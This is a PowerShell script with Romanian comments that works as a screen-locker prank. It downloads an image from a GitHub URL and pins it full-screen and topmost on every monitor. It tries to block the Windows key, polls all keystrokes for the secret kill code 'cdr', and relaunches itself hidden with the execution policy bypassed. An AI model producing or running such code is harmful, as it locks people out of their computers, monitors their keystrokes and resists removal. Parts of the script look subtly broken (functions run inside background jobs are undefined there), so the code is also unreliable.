# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Detectare și blocare tasta Windows, detectare `cdr`
function Monitor-Keys {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Windows.Forms;

        public class InterceptKeys {
            [DllImport("user32.dll")]
            public static extern short GetAsyncKeyState(Keys vKey);

            public static bool IsKeyDown(Keys key) {
                return (GetAsyncKeyState(key) & 0x8000) != 0;
            }
        }
"@
    $keyBuffer = ""
    while ($true) {
        # Detectare tasta Windows
        if ([InterceptKeys]::IsKeyDown([System.Windows.Forms.Keys]::LWin) -or [InterceptKeys]::IsKeyDown([System.Windows.Forms.Keys]::RWin)) {
            Start-Sleep -Milliseconds 200
            continue  # Blochează acțiunea tasta Windows
        }

        # Detectare `cdr`
        foreach ($key in [System.Windows.Forms.Keys].GetEnumValues()) {
            if ([InterceptKeys]::IsKeyDown($key)) {
                $keyBuffer += $key.ToString().ToLower()
                Start-Sleep -Milliseconds 100
                if ($keyBuffer -like "*cdr") {
                    Stop-All
                }
                if ($keyBuffer.Length -gt 3) {
                    $keyBuffer = $keyBuffer.Substring($keyBuffer.Length - 3)  # Păstrează ultimele 3 taste
                }
            }
        }
        Start-Sleep -Milliseconds 100
    }
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    # Rulează formularele pe toate monitoarele
    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    Write-Host "Aplicația a fost oprită prin codul secret 'cdr'." -ForegroundColor Green
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Funcție de monitorizare pentru repornire automată
function Monitor-Image {
    $scriptPath = $MyInvocation.MyCommand.Definition

    while ($true) {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
        if (-not $processes) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        }
        Start-Sleep -Seconds 2
    }
}

# Pornire aplicație principală și monitorizare
Download-Image
Start-Job -ScriptBlock { Monitor-Image }
Start-Job -ScriptBlock { Monitor-Keys }
Show-FullScreenImage
